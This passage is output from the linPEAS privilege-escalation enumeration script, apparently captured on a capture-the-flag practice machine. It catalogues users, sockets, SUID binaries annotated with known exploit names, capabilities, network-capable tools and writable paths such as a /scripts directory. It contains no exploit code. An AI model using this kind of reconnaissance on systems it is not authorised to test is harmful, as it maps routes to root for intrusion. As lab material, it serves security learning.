/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                              
/run/dbus/system_bus_socket                                                                             
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                
NAME                               PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                               604 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
:1.1                                 1 systemd         root             :1.1          init.scope                -          -                  
:1.2                               609 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
:1.38                            87869 busctl          scriptmanager    :1.38         apache2.service           -          -                  
com.ubuntu.LanguageSelector          - -               -                (activatable) -                         -         
org.freedesktop.Accounts           609 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
org.freedesktop.DBus               633 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.hostname1            - -               -                (activatable) -                         -         
org.freedesktop.locale1              - -               -                (activatable) -                         -         
org.freedesktop.login1             604 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
org.freedesktop.network1             - -               -                (activatable) -                         -         
org.freedesktop.resolve1             - -               -                (activatable) -                         -         
org.freedesktop.systemd1             1 systemd         root             :1.1          init.scope                -          -                  
org.freedesktop.timedate1            - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                     
                              ╚═════════════════════╝                                                   
╔══════════╣ Hostname, hosts and DNS
bashed                                                                                                  
127.0.0.1       localhost
127.0.1.1       bashed

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                     
link-local 169.254.0.0
ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:b3:73  
          inet addr:10.10.10.68  Bcast:10.10.10.255  Mask:255.255.255.255
          inet6 addr: dead:beef::250:56ff:feb9:b373/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:b373/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:109805 errors:0 dropped:25 overruns:0 frame:0
          TX packets:99860 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:12258253 (12.2 MB)  TX bytes:10563493 (10.5 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:40492 errors:0 dropped:0 overruns:0 frame:0
          TX packets:40492 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:3010272 (3.0 MB)  TX bytes:3010272 (3.0 MB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                           
tcp6       0      0 :::80                   :::*                    LISTEN      -                       

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                      
                                                                                                        


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                     
                               ╚═══════════════════╝                                                    
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)                              

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                            
netpgpkeys Not Found
netpgp Not Found                                                                                        
                                                                                                        
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                        
                                                                                                        
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                  
ptrace protection is enabled (1)                                                                        

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                      
                                                                                                        
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                         

╔══════════╣ Users with console
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash                                                  
root:x:0:0:root:/root:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                  
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 04:11:30 up  2:05,  0 users,  load average: 0.00, 0.00, 0.00                                           
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
arrexel  tty1         Mon Dec  4 14:01:56 2017 - down                      (00:00)     0.0.0.0          
reboot   system boot  Mon Dec  4 14:01:10 2017 - Mon Dec  4 14:02:53 2017  (00:01)     0.0.0.0
arrexel  tty1         Mon Dec  4 13:33:30 2017 - down                      (00:27)     0.0.0.0
reboot   system boot  Mon Dec  4 13:33:02 2017 - Mon Dec  4 14:01:02 2017  (00:28)     0.0.0.0
arrexel  tty1         Mon Dec  4 12:53:09 2017 - crash                     (00:39)     0.0.0.0
reboot   system boot  Mon Dec  4 12:52:44 2017 - Mon Dec  4 14:01:02 2017  (01:08)     0.0.0.0
arrexel  tty1         Mon Dec  4 11:19:34 2017 - crash                     (01:33)     0.0.0.0
reboot   system boot  Mon Dec  4 11:17:55 2017 - Mon Dec  4 14:01:02 2017  (02:43)     0.0.0.0

wtmp begins Mon Dec  4 11:17:55 2017

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                       
arrexel          tty1                      Sat Dec 23 20:20:46 -0800 2017

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                         
                                                                                                        
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                      
                                                                                                        


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                      
                             ╚══════════════════════╝                                                   
╔══════════╣ Useful software
/usr/bin/base64                                                                                         
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-5                                                                                        

╔══════════╣ Searching mysql credentials and exec
                                                                                                        
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)                                                  
Server built:   2017-09-18T15:09:02
httpd Not Found
                                                                                                        
Nginx version: nginx Not Found
                                                                                                        
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jun  2  2022 /etc/apache2/sites-enabled                                     
drwxr-xr-x 2 root root 4096 Jun  2  2022 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Dec  4  2017 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                       
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Mar 19  2016 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Dec  4  2017 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 70999 Aug  9  2017 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Aug  9  2017 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                    
drwxr-xr-x 2 root root 4096 Jun  2  2022 /etc/ldap


╔══════════╣ Searching ssl/ssh files
══╣ Some certificates were found (out limited):                                                         
/etc/ssl/certs/ACCVRAIZ1.pem                                                                            
/etc/ssl/certs/ACEDICOM_Root.pem
/etc/ssl/certs/AC_Raíz_Certicámara_S.A..pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/etc/ssl/certs/AddTrust_Public_Services_Root.pem
/etc/ssl/certs/AddTrust_Qualified_Certificates_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/ApplicationCA_-_Japanese_Government.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_CA_1.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig.pem
80469PSTORAGE_CERTSBIN


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun  2  2022 /etc/pam.d                                                     




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Dec  4  2017 /usr/share/keyrings                                            
drwxr-xr-x 2 root root 4096 Jun  2  2022 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                          
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                            
netpgpkeys Not Found
netpgp Not Found                                                                                        
                                                                                                        
-rw-r--r-- 1 root root 12255 Feb 15  2017 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Feb 15  2017 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg



╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix                  


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                        


-rw-r--r-- 1 root root 69 Aug  9  2017 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Aug  9  2017 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc                                              
-rw-r--r-- 1 arrexel arrexel 3786 Dec  4  2017 /home/arrexel/.bashrc
-rw-r--r-- 1 scriptmanager scriptmanager 3786 Dec  4  2017 /home/scriptmanager/.bashrc





-rw-r--r-- 1 root root 655 Jun 24  2016 /etc/skel/.profile
-rw-r--r-- 1 arrexel arrexel 655 Dec  4  2017 /home/arrexel/.profile
-rw-r--r-- 1 scriptmanager scriptmanager 655 Dec  4  2017 /home/scriptmanager/.profile



-rw-r--r-- 1 arrexel arrexel 0 Dec  4  2017 /home/arrexel/.sudo_as_admin_successful



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                      
                      ╚════════════════════════════════════╝                                            
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                        
strings Not Found                                                                                       
-rwsr-xr-x 1 root root 40K Dec 16  2016 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                         
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K Mar 29  2016 /bin/su
-rwsr-xr-x 1 root root 27K Dec 16  2016 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)                                                                           
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40K Mar 29  2016 /usr/bin/chsh
-rwsr-xr-x 1 root root 39K Mar 29  2016 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 134K Jan 20  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 49K Mar 29  2016 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 53K Mar 29  2016 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                          
-rwsr-xr-x 1 root root 74K Mar 29  2016 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 11K Feb  9  2017 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 419K Aug 11  2016 /usr/lib/openssh/ssh-keysign

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                        
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd                                   
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 23K Mar 29  2016 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 351K Aug 11  2016 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 61K Mar 29  2016 /usr/bin/chage
-rwxr-sr-x 1 root tty 27K Dec 16  2016 /usr/bin/wall
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root mlocate 39K Nov 17  2014 /usr/bin/mlocate

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                
/etc/ld.so.conf                                                                                         
Content of /etc/ld.so.conf:                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                           
  - /usr/local/lib                                                                                      
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu                                                                               
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                               
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                         
══╣ Current shell capabilities                                                                          
CapInh:  0x0000000000000000=                                                                            
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                            
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3310 Apr 12  2016 sbin.dhclient                                                  
-rw-r--r-- 1 root root 1527 Jan  5  2016 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1454 Jun  2  2015 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                 
files with acls in searched folders Not Found                                                           
                                                                                                        
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                       
total 16                                                                                                
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d         
                                                                                                        
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                            
═╣ Credentials in fstab/mtab? ........... No                                                            
═╣ Can I read shadow files? ............. No                                                            
═╣ Can I read shadow plists? ............ No                                                            
═╣ Can I write shadow plists? ........... No                                                            
═╣ Can I read opasswd file? ............. No                                                            
═╣ Can I write in network-scripts? ...... No                                                            
═╣ Can I read root folder? .............. No                                                            
                                                                                                        
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                  
/home/arrexel/.bash_history
/root/
/var/www
/var/www/html
/var/www/html/contact.html
/var/www/html/fonts
/var/www/html/fonts/fontawesome-webfont.svg
/var/www/html/fonts/FontAwesome.otf
/var/www/html/fonts/fontawesome-webfont.eot
/var/www/html/fonts/fontawesome-webfont.ttf
/var/www/html/fonts/fontawesome-webfont.woff
/var/www/html/fonts/fontawesome-webfont.woff2
/var/www/html/demo-images
/var/www/html/demo-images/bg.jpg
/var/www/html/demo-images/profile_01.jpg
/var/www/html/demo-images/02_blogpost_galery.jpg
/var/www/html/demo-images/02.jpg
/var/www/html/demo-images/featured-image.jpg
/var/www/html/demo-images/bash2.png
/var/www/html/demo-images/01.jpg
/var/www/html/demo-images/01_blogpost_galery.jpg
/var/www/html/demo-images/03_blogpost_galery.jpg
/var/www/html/demo-images/bash1.png
/var/www/html/demo-images/03.jpg
/var/www/html/demo-images/one_drop_post_image02.jpg
/var/www/html/scroll.html
/var/www/html/index.html
/var/www/html/style.css
/var/www/html/config.php

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 root root 12 Dec 13 04:11 /scripts/test.txt                                                

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                        
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                       
/dev/mqueue                                                                                             
/dev/shm
/home/scriptmanager
/run/lock
/scripts
/scripts/test.py
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/lib/php/sessions
/var/tmp
/var/www/html/uploads
/var/www/html/uploads/index.html

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                       
  Group scriptmanager:                                                                                  
/scripts                                                                                                



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                     
                            ╚═════════════════════════╝                                                 
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path              
/usr/bin/gettext.sh                                                                                     

╔══════════╣ Executable files potentially added by user (limit 70)
2017-12-04+12:44:07.8623993630 /var/www/html/uploads/index.html                                         

╔══════════╣ Unexpected in root
/scripts                                                                                                
/initrd.img
/.bash_history
/vmlinuz

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/scripts/test.txt                                                                                       
/home/scriptmanager/.gnupg/trustdb.gpg
/home/scriptmanager/.gnupg/pubring.gpg
/home/scriptmanager/.gnupg/gpg.conf
/var/log/auth.log
/var/log/syslog


╔══════════╣ Files inside /home/scriptmanager (limit 20)
total 32                                                                                                
drwxr-xr-x 4 scriptmanager scriptmanager 4096 Dec 13 04:11 .
drwxr-xr-x 4 root          root          4096 Dec  4  2017 ..
-rw------- 1 scriptmanager scriptmanager    2 Dec  4  2017 .bash_history
-rw-r--r-- 1 scriptmanager scriptmanager  220 Dec  4  2017 .bash_logout
-rw-r--r-- 1 scriptmanager scriptmanager 3786 Dec  4  2017 .bashrc
drwx------ 2 scriptmanager scriptmanager 4096 Dec 13 04:11 .gnupg
drwxr-xr-x 2 scriptmanager scriptmanager 4096 Dec  4  2017 .nano
-rw-r--r-- 1 scriptmanager scriptmanager  655 Dec  4  2017 .profile

╔══════════╣ Files inside others home (limit 20)
/home/arrexel/.profile                                                                                  
/home/arrexel/.bashrc
/home/arrexel/user.txt
/home/arrexel/.bash_logout
/home/arrexel/.sudo_as_admin_successful
/var/www/html/contact.html
/var/www/html/fonts/fontawesome-webfont.svg
/var/www/html/fonts/FontAwesome.otf
/var/www/html/fonts/fontawesome-webfont.eot
/var/www/html/fonts/fontawesome-webfont.ttf
/var/www/html/fonts/fontawesome-webfont.woff
/var/www/html/fonts/fontawesome-webfont.woff2
/var/www/html/demo-images/bg.jpg
/var/www/html/demo-images/profile_01.jpg
/var/www/html/demo-images/02_blogpost_galery.jpg
/var/www/html/demo-images/02.jpg
/var/www/html/demo-images/featured-image.jpg
/var/www/html/demo-images/bash2.png
/var/www/html/demo-images/01.jpg
/var/www/html/demo-images/01_blogpost_galery.jpg

╔══════════╣ Searching installed mail applications
                                                                                                        
╔══════════╣ Mails (limit 50)
                                                                                                        
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 128 Dec  4  2017 /var/lib/sgml-base/supercatalog.old                             
-rw-r--r-- 1 root root 673 Dec  4  2017 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Dec  4  2017 /etc/xml/catalog.old
-rw-r--r-- 1 root root 3024 Dec  4  2017 /etc/apt/sources.bak
-rw-r--r-- 1 root root 20 Feb  9  2017 /etc/vmware-tools/tools.conf.old
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 1298 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2418 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1427 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 1732 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 2530 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 3094 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2034 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 2308 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-first.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2392 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1422 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-check.page
